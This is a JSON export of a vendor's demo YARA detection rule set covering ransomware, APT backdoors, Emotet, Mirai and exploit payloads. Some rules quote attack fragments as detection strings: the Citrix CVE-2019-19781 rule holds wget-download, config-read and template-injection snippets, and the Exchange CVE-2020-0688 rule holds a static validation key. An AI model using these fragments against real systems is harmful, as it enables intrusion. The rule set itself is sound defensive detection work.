{"api_version":"1.0.1","copyright":"Nextron Systems GmbH","customer":"demo","date":"2020-05-12 09:36:07","legal_note":"This is the VALHALLA demo rule set. The content represents the 'signature-base' repository in a streamlined format but lacks the rules provided by 3rd parties. All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.","rules":[{"author":"Florian Roth","content":"rule MAL_RANSOM_Ragna_Locker_Apr20_1_RID3195 : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects Ragna Locker Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://otx.alienvault.com/indicator/file/c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6\"\n      date = \"2020-04-27 13:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"---RAGNAR SECRET---\" ascii\n      $xc1 = { 0D 0A 25 73 0D 0A 0D 0A 25 73 0D 0A 25 73 0D 0A\n               25 73 0D 0A 0D 0A 25 73 0D 0A 00 00 2E 00 72 00\n               61 00 67 00 6E 00 61 00 72 00 5F } \n      $xc2 = { 00 2D 00 66 00 6F 00 72 00 63 00 65 00 00 00 00\n               00 57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C\n               00 44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00\n               00 5C 00 6E 00 6F 00 74 00 65 00 70 00 61 00 64\n               00 2E 00 65 00 78 00 65 00 } \n      $s1 = \"bootfont.bin\" wide fullword\n      $sc2 = { 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 00\n               00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 2E\n               00 6F 00 6C 00 64 00 00 00 54 00 6F 00 72 00 20\n               00 62 00 72 00 6F 00 77 00 73 00 65 00 72 00 } \n      $op1 = { c7 85 58 ff ff ff 55 00 6b 00 c7 85 5c ff ff ff } \n      $op2 = { 50 c7 85 7a ff ff ff 5c } \n      $op3 = { 8b 75 08 8a 84 0d 20 ff ff ff ff 45 08 32 06 8b } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 4 of them\n}","date":"2020-04-27 13:28:41","description":"Detects Ragna Locker Ransomware","minimum_yara":"1.7","name":"MAL_RANSOM_Ragna_Locker_Apr20_1_RID3195","reference":"https://otx.alienvault.com/indicator/file/c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6","required_modules":[],"rule_hash":"c2e2a16c2b5d5cc5bb882b859d0210ee","score":75,"tags":["RANSOM","MAL","DEMO","EXE","FILE","CRIME"]},{"author":"Florian Roth","content":"rule MAL_RANSOM_COVID19_Apr20_1_RID2ECC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ransomware distributed in COVID-19 theme\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/\"\n      date = \"2020-04-15 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/savekey.php\" wide\n      $op1 = { 3f ff ff ff ff ff 0b b4 } \n      $op2 = { 60 2e 2e 2e af 34 34 34 b8 34 34 34 b8 34 34 34 } \n      $op3 = { 1f 07 1a 37 85 05 05 36 83 05 05 36 83 05 05 34 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them\n}","date":"2020-04-15 11:29:51","description":"Detects ransomware distributed in COVID-19 theme","minimum_yara":"1.7","name":"MAL_RANSOM_COVID19_Apr20_1_RID2ECC","reference":"https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/","required_modules":[],"rule_hash":"6c603e4299b4083b0ef68322ef2c0a4f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_APT41_CN_ELF_Speculoos_Backdoor_RID3365 : APT DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects Speculoos Backdoor used by APT41\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/\"\n      date = \"2020-04-14 14:46:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 2F 70 72 69 76 61 74 65 2F 76 61 72 00 68 77 2E\n               70 68 79 73 6D 65 6D 00 68 77 2E 75 73 65 72 6D\n               65 6D 00 4E 41 2D 4E 41 2D 4E 41 2D 4E 41 2D 4E\n               41 2D 4E 41 00 6C 6F 30 00 00 00 00 25 30 32 78\n               2D 25 30 32 78 2D 25 30 32 78 2D 25 30 32 78 2D\n               25 30 32 78 2D 25 30 32 78 0A 00 72 00 4E 41 00\n               75 6E 61 6D 65 20 2D 76 } \n      $s1 = \"badshell\" ascii fullword\n      $s2 = \"hw.physmem\" ascii fullword\n      $s3 = \"uname -v\" ascii fullword\n      $s4 = \"uname -s\" ascii fullword\n      $s5 = \"machdep.tsc_freq\" ascii fullword\n      $s6 = \"/usr/sbin/config.bak\" ascii fullword\n      $s7 = \"enter MessageLoop...\" ascii fullword\n      $s8 = \"exit StartCBProcess...\" ascii fullword\n      $sc1 = { 72 6D 20 2D 72 66 20 22 25 73 22 00 2F 70 72 6F\n               63 2F } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 600KB and 1 of ( $x* ) or 4 of them\n}","date":"2020-04-14 14:46:01","description":"Detects Speculoos Backdoor used by APT41","minimum_yara":"1.7","name":"APT_APT41_CN_ELF_Speculoos_Backdoor_RID3365","reference":"https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/","required_modules":[],"rule_hash":"4e88b1dffab11de4f5c7ea12e6088310","score":90,"tags":["APT","DEMO","LINUX","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Reversed_Base64_Encoded_EXE_RID3291 : DEMO SUSP T1132 {\n   meta:\n      description = \"Detects an base64 encoded executable with reversed characters\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-04-06 14:10:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"DEMO, SUSP, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AEAAAAEQATpVT\" \n      $s2 = \"AAAAAAAAAAoVT\" \n      $s3 = \"AEAAAAEAAAqVT\" \n      $s4 = \"AEAAAAIAAQpVT\" \n      $s5 = \"AEAAAAMAAQqVT\" \n      $sh1 = \"SZk9WbgM1TEBibpBib1JHIlJGI09mbuF2Yg0WYyd2byBHIzlGaU\" ascii\n      $sh2 = \"LlR2btByUPREIulGIuVncgUmYgQ3bu5WYjBSbhJ3ZvJHcgMXaoR\" ascii\n      $sh3 = \"uUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGV\" ascii\n   condition: \n      filesize < 10000KB and 1 of them\n}","date":"2020-04-06 14:10:41","description":"Detects an base64 encoded executable with reversed characters","minimum_yara":"1.7","name":"SUSP_Reversed_Base64_Encoded_EXE_RID3291","reference":"Internal Research","required_modules":[],"rule_hash":"67f59e93c48ee96bfa929d5a890deaeb","score":80,"tags":["SUSP","DEMO","T1132"]},{"author":"Florian Roth","content":"rule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE LINUX RUSSIA {\n   meta:\n      description = \"Detects Penquin Turla Linux malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/IntezerLabs/status/1247131160452509696\"\n      date = \"2020-04-05 14:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/root/.hsperfdata\" ascii fullword\n      $s2 = \"Desc|     Filename     |  size  |state|\" ascii fullword\n      $s3 = \"IPv6 address %s not supported\" ascii fullword\n      $s4 = \"File already exist on remote filesystem !\" ascii fullword\n      $s5 = \"/tmp/.sync.pid\" ascii fullword\n      $s6 = \"'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them\n}","date":"2020-04-05 14:12:11","description":"Detects Penquin Turla Linux malware","minimum_yara":"1.7","name":"APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A","reference":"https://twitter.com/IntezerLabs/status/1247131160452509696","required_modules":[],"rule_hash":"464af380143940f3512b11c01380a487","score":75,"tags":["APT","RUSSIA","LINUX","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_Netsha_Mar20_1_RID2D1E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Netsha malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-03-24 10:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"the best. Fuck off all the rest.\" \n      $x2 = \"Neshta 1.0 Made in Belarus. \" ascii\n      $op1 = { 85 c0 93 0f 85 62 ff ff ff 5e 5b 89 ec 5d c2 04 } \n      $op2 = { e8 e5 f1 ff ff 8b c3 e8 c6 ff ff ff 85 c0 75 0c } \n      $op3 = { eb 02 33 db 8b c3 5b c3 53 85 c0 74 15 ff 15 34 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $x* ) or 3 of them\n}","date":"2020-03-24 10:18:11","description":"Detects Netsha malware","minimum_yara":"1.7","name":"MAL_Netsha_Mar20_1_RID2D1E","reference":"Internal Research","required_modules":[],"rule_hash":"1c4314d3604e3bf077fabb43fa0411a6","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule VUL_Tomcat_Catalina_CVE_2020_1938_RID31DF : DEMO EXPLOIT T1210 VULN {\n   meta:\n      description = \"Detects a possibly active and vulnerable Tomcat configuration that includes an accessible and unprotected AJP connector (you can ignore backup files or files that are not actively used)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.chaitin.cn/en/ghostcat\"\n      date = \"2020-02-28 13:41:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, T1210, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" \n      $a1 = \"<Service name=\\\"Catalina\\\">\" ascii\n      $v1 = \"<Connector port=\\\"8009\\\" protocol=\\\"AJP/1.3\\\" redirectPort=\\\"8443\\\"/>\" ascii\n      $fp1 = \"<!--<Connector port=\\\"8009\\\" protocol=\\\"AJP/1.3\\\" redirectPort=\\\"8443\\\"\" ascii\n      $fp2 = \" secret=\\\"\" ascii\n      $fp3 = \" requiredSecret=\\\"\" ascii\n   condition: \n      $h1 at 0 and filesize <= 300KB and $a1 and $v1 and not 1 of ( $fp* )\n}","date":"2020-02-28 13:41:01","description":"Detects a possibly active and vulnerable Tomcat configuration that includes an accessible and unprotected AJP connector (you can ignore backup files or files that are not actively used)","minimum_yara":"1.7","name":"VUL_Tomcat_Catalina_CVE_2020_1938_RID31DF","reference":"https://www.chaitin.cn/en/ghostcat","required_modules":[],"rule_hash":"273c309be1d259ecf287b29a614aa659","score":50,"tags":["EXPLOIT","DEMO","VULN","T1210"]},{"author":"Florian Roth","content":"rule VUL_Exchange_CVE_2020_0688_RID2F1F : DEMO EXPLOIT VULN {\n   meta:\n      description = \"Detects static validation key used by Exchange server in web.config\"\n      author = \"Florian Roth\"\n      reference = \"https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\"\n      date = \"2020-02-26 11:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" \n      $x1 = \"<machineKey validationKey=\\\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\\\"\" ascii wide\n   condition: \n      filesize <= 300KB and $h1 at 0 and $x1\n}","date":"2020-02-26 11:43:41","description":"Detects static validation key used by Exchange server in web.config","minimum_yara":"1.7","name":"VUL_Exchange_CVE_2020_0688_RID2F1F","reference":"https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys","required_modules":[],"rule_hash":"46b77f7a5ed39b1f8dc079fadb8c5f39","score":70,"tags":["EXPLOIT","DEMO","VULN"]},{"author":"Florian Roth","content":"rule MAL_Netsha_Feb20_1_RID2D0B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Netsha malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-02-24 10:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { e8 3c 2a ff ff b8 ff ff ff 7f eb 3e 83 7d 0c 00 } \n      $op2 = { 2b c7 50 e8 a4 40 ff ff ff b6 88 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize >= 3000KB and filesize <= 8000KB and all of them\n}","date":"2020-02-24 10:15:01","description":"Detects Netsha malware","minimum_yara":"1.7","name":"MAL_Netsha_Feb20_1_RID2D0B","reference":"Internal Research","required_modules":[],"rule_hash":"779cb32955241f2bf6cc4e48da3cb26d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Emotet_Jan20_1_RID2D22 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emotet malware\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/5e81638e-df2e-4a5b-9e45-b07c38d53929/\"\n      date = \"2020-01-29 10:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { 74 60 8d 34 18 eb 54 03 c3 50 ff 15 18 08 41 00 } \n      $op1 = { 03 fe 66 39 07 0f 85 2a ff ff ff 8b 4d f0 6a 20 } \n      $op2 = { 8b 7d fc 0f 85 49 ff ff ff 85 db 0f 84 d1 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 200KB and ( pe.imphash ( ) == \"009889c73bd2e55113bf6dfa5f395e0d\" or 1 of them )\n}","date":"2020-01-29 10:18:51","description":"Detects Emotet malware","minimum_yara":"1.7","name":"MAL_Emotet_Jan20_1_RID2D22","reference":"https://app.any.run/tasks/5e81638e-df2e-4a5b-9e45-b07c38d53929/","required_modules":["pe"],"rule_hash":"cefd9f6a41c0ec95e5bd654d26497663","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_PS1_FromBase64String_Content_Indicator_RID3714 : DEMO SCRIPT SUSP T1086 T1132 {\n   meta:\n      description = \"Detects suspicious base64 encoded PowerShell expressions\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\"\n      date = \"2020-01-25 17:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"::FromBase64String(\\\"H4s\" ascii wide\n      $ = \"::FromBase64String(\\\"TVq\" ascii wide\n      $ = \"::FromBase64String(\\\"UEs\" ascii wide\n      $ = \"::FromBase64String(\\\"JAB\" ascii wide\n      $ = \"::FromBase64String(\\\"SUVY\" ascii wide\n      $ = \"::FromBase64String(\\\"SQBFAF\" ascii wide\n      $ = \"::FromBase64String(\\\"SQBuAH\" ascii wide\n      $ = \"::FromBase64String(\\\"PAA\" ascii wide\n      $ = \"::FromBase64String(\\\"cwBhA\" ascii wide\n      $ = \"::FromBase64String(\\\"aWV4\" ascii wide\n      $ = \"::FromBase64String(\\\"aQBlA\" ascii wide\n      $ = \"::FromBase64String(\\\"R2V0\" ascii wide\n      $ = \"::FromBase64String(\\\"dmFy\" ascii wide\n      $ = \"::FromBase64String(\\\"dgBhA\" ascii wide\n      $ = \"::FromBase64String(\\\"dXNpbm\" ascii wide\n      $ = \"::FromBase64String(\\\"H4sIA\" ascii wide\n      $ = \"::FromBase64String(\\\"Y21k\" ascii wide\n      $ = \"::FromBase64String(\\\"Qzpc\" ascii wide\n      $ = \"::FromBase64String(\\\"Yzpc\" ascii wide\n      $ = \"::FromBase64String(\\\"IAB\" ascii wide\n      $ = \"::FromBase64String('H4s\" ascii wide\n      $ = \"::FromBase64String('TVq\" ascii wide\n      $ = \"::FromBase64String('UEs\" ascii wide\n      $ = \"::FromBase64String('JAB\" ascii wide\n      $ = \"::FromBase64String('SUVY\" ascii wide\n      $ = \"::FromBase64String('SQBFAF\" ascii wide\n      $ = \"::FromBase64String('SQBuAH\" ascii wide\n      $ = \"::FromBase64String('PAA\" ascii wide\n      $ = \"::FromBase64String('cwBhA\" ascii wide\n      $ = \"::FromBase64String('aWV4\" ascii wide\n      $ = \"::FromBase64String('aQBlA\" ascii wide\n      $ = \"::FromBase64String('R2V0\" ascii wide\n      $ = \"::FromBase64String('dmFy\" ascii wide\n      $ = \"::FromBase64String('dgBhA\" ascii wide\n      $ = \"::FromBase64String('dXNpbm\" ascii wide\n      $ = \"::FromBase64String('H4sIA\" ascii wide\n      $ = \"::FromBase64String('Y21k\" ascii wide\n      $ = \"::FromBase64String('Qzpc\" ascii wide\n      $ = \"::FromBase64String('Yzpc\" ascii wide\n      $ = \"::FromBase64String('IAB\" ascii wide\n   condition: \n      filesize < 5000KB and 1 of them\n}","date":"2020-01-25 17:23:11","description":"Detects suspicious base64 encoded PowerShell expressions","minimum_yara":"1.7","name":"SUSP_PS1_FromBase64String_Content_Indicator_RID3714","reference":"https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639","required_modules":[],"rule_hash":"27789fb7493719a9d1ee1834cdfcd743","score":75,"tags":["SUSP","DEMO","T1132","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule EXPL_Shitrix_Exploit_Code_Jan20_1_RID331C : DEMO EXPLOIT T1105 {\n   meta:\n      description = \"Detects payloads used in Shitrix exploitation CVE-2019-19781\"\n      author = \"Florian Roth\"\n      reference = \"https://isc.sans.edu/forums/diary/Citrix+ADC+Exploits+Overview+of+Observed+Payloads/25704/\"\n      date = \"2020-01-13 14:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"DEMO, EXPLOIT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s01 = \"/netscaler/portal/scripts/rmpm.pl\" ascii\n      $s02 = \"tee /netscaler/portal/templates/\" ascii\n      $s03 = \"exec(\\\\'(wget -q -O- http://\" ascii\n      $s04 = \"cd /netscaler/portal; ls\" ascii\n      $s05 = \"cat /flash/nsconfig/ns.conf\" ascii\n      $s06 = \"/netscaler/portal/scripts/PersonalBookmak.pl\" ascii\n      $s07 = \"template.new({'BLOCK'='print readpipe(\" ascii\n      $s08 = \"pwnpzi1337\" fullword ascii\n      $s09 = \"template.new({'BLOCK'=\" \n      $s10 = \"template.new({'BLOCK'%3d\" \n      $s11 = \"my ($citrixmd, %FORM);\" \n      $s12 = \"(CMD, \\\"($citrixmd) 2>&1\" \n      $b1 = \"NSC_USER:\" ascii nocase\n      $b2 = \"NSC_NONCE:\" ascii nocase\n      $b3 = \"/../\" ascii\n   condition: \n      1 of ( $s* ) or all of ( $b* )\n}","date":"2020-01-13 14:33:51","description":"Detects payloads used in Shitrix exploitation CVE-2019-19781","minimum_yara":"1.7","name":"EXPL_Shitrix_Exploit_Code_Jan20_1_RID331C","reference":"https://isc.sans.edu/forums/diary/Citrix+ADC+Exploits+Overview+of+Observed+Payloads/25704/","required_modules":[],"rule_hash":"08ab800d3cd688c2bb6a777591eb5299","score":70,"tags":["EXPLOIT","DEMO","T1105"]},{"author":"Florian Roth","content":"rule MAL_ME_RawDisk_Agent_Jan20_2_RID30A9 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects suspicious malware using ElRawDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/jfslowik/status/1212501454549741568?s=09\"\n      date = \"2020-01-02 12:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\Dustman.pdb\" fullword ascii\n      $x2 = \"/c agent.exe A\" fullword ascii\n      $s1 = \"C:\\\\windows\\\\system32\\\\cmd.exe\" fullword ascii\n      $s2 = \"The Magic Word!\" fullword ascii\n      $s3 = \"Software\\\\Oracle\\\\VirtualBox\" fullword wide\n      $s4 = \"\\\\assistant.sys\" fullword wide\n      $s5 = \"Down With Bin Salman\" fullword wide\n      $sc1 = { 00 5C 00 5C 00 2E 00 5C 00 25 00 73 } \n      $op1 = { 49 81 c6 ff ff ff 7f 4c 89 b4 24 98 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 3000KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2020-01-02 12:49:21","description":"Detects suspicious malware using ElRawDisk","minimum_yara":"1.7","name":"MAL_ME_RawDisk_Agent_Jan20_2_RID30A9","reference":"https://twitter.com/jfslowik/status/1212501454549741568?s=09","required_modules":[],"rule_hash":"c0f53fa486136308a8ef38f97b6f8bec","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_ME_RawDisk_Agent_Jan20_1_RID30A8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects suspicious malware using ElRawDisk\"\n      author = \"Florian Roth\"\n      reference = \"Saudi National Cybersecurity Authority - Destructive Attack DUSTMAN\"\n      date = \"2020-01-02 12:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\drv\\\\agent.plain.pdb\" fullword ascii\n      $x2 = \" ************** Down With Saudi Kingdom, Down With Bin Salman ************** \" fullword ascii\n      $s1 = \".?AVERDError@@\" fullword ascii\n      $s2 = \"b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\" fullword wide\n      $s3 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n      $s4 = \"\\\\??\\\\c:\" fullword wide\n      $op1 = { e9 3d ff ff ff 33 c0 48 89 05 0d ff 00 00 48 8b } \n      $op2 = { 0f b6 0c 01 88 48 34 48 8b 8d a8 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2020-01-02 12:49:11","description":"Detects suspicious malware using ElRawDisk","minimum_yara":"1.7","name":"MAL_ME_RawDisk_Agent_Jan20_1_RID30A8","reference":"Saudi National Cybersecurity Authority - Destructive Attack DUSTMAN","required_modules":[],"rule_hash":"eda64fa472ea13b95067e3736b579cc4","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_VHD_Suspicious_Small_Size_RID3285 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects suspicious VHD files\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/MeltX0R/status/1208095892877774850\"\n      date = \"2019-12-21 14:08:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $hc1 = { 63 6F 6E 65 63 74 69 78 } \n   condition: \n      uint16 ( 0 ) == 0x6f63 and $hc1 at 0 and filesize <= 4000KB\n}","date":"2019-12-21 14:08:41","description":"Detects suspicious VHD files","minimum_yara":"1.7","name":"SUSP_VHD_Suspicious_Small_Size_RID3285","reference":"https://twitter.com/MeltX0R/status/1208095892877774850","required_modules":[],"rule_hash":"55d42f2ac36c06316f5c3e7c1a5fd895","score":50,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule SUSP_RAR_NtdsDIT_RID2C79 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects suspicious RAR file that contains ntds.dit or SAM export\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers\"\n      date = \"2019-12-16 09:50:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ntds.dit0\" ascii fullword\n      $x2 = { 0? 53 41 4D 30 01 00 03 } \n      $x3 = { 0? 73 61 6D 30 01 00 03 } \n   condition: \n      uint32 ( 0 ) == 0x21726152 and 1 of them\n}","date":"2019-12-16 09:50:41","description":"Detects suspicious RAR file that contains ntds.dit or SAM export","minimum_yara":"1.7","name":"SUSP_RAR_NtdsDIT_RID2C79","reference":"https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers","required_modules":[],"rule_hash":"0fa157762609b6ea88831e7989f0db62","score":70,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_Mirai_Nov19_1_RID2CC8 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/bad_packets/status/1194049104533282816\"\n      date = \"2019-11-13 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SERVZUXO\" fullword ascii\n      $s2 = \"-loldongs\" fullword ascii\n      $s3 = \"/dev/null\" fullword ascii\n      $s4 = \"/bin/busybox\" fullword ascii\n      $sc1 = { 47 72 6F 75 70 73 3A 09 30 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize <= 100KB and 4 of them\n}","date":"2019-11-13 10:03:51","description":"Detects Mirai malware","minimum_yara":"1.7","name":"MAL_Mirai_Nov19_1_RID2CC8","reference":"https://twitter.com/bad_packets/status/1194049104533282816","required_modules":[],"rule_hash":"dcdac42c5451204de9c25487e0d22cb2","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Double_Base64_Encoded_Executable_RID34CC : DEMO SUSP T1132 {\n   meta:\n      description = \"Detects an executable that has been encoded with base64 twice\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/TweeterCyber/status/1189073238803877889\"\n      date = \"2019-10-29 15:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"VFZwVEFRR\" ascii wide\n      $ = \"RWcFRBUU\" ascii wide\n      $ = \"UVnBUQVFF\" ascii wide\n      $ = \"VFZvQUFBQ\" ascii wide\n      $ = \"RWb0FBQU\" ascii wide\n      $ = \"UVm9BQUFB\" ascii wide\n      $ = \"VFZxQUFBR\" ascii wide\n      $ = \"RWcUFBQU\" ascii wide\n      $ = \"UVnFBQUFF\" ascii wide\n      $ = \"VFZwUUFBS\" ascii wide\n      $ = \"RWcFFBQU\" ascii wide\n      $ = \"UVnBRQUFJ\" ascii wide\n      $ = \"VFZxUUFBT\" ascii wide\n      $ = \"RWcVFBQU\" ascii wide\n      $ = \"UVnFRQUFN\" ascii wide\n   condition: \n      1 of them\n}","date":"2019-10-29 15:45:51","description":"Detects an executable that has been encoded with base64 twice","minimum_yara":"1.7","name":"SUSP_Double_Base64_Encoded_Executable_RID34CC","reference":"https://twitter.com/TweeterCyber/status/1189073238803877889","required_modules":[],"rule_hash":"906d69b672cc2b2947ee73d51f0611f1","score":75,"tags":["SUSP","DEMO","T1132"]},{"author":"Florian Roth","content":"rule SUSP_XORed_Mozilla_RID2DB4 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious XORed keyword - Mozilla/5.0\"\n      author = \"Florian Roth\"\n      reference = \"Internal 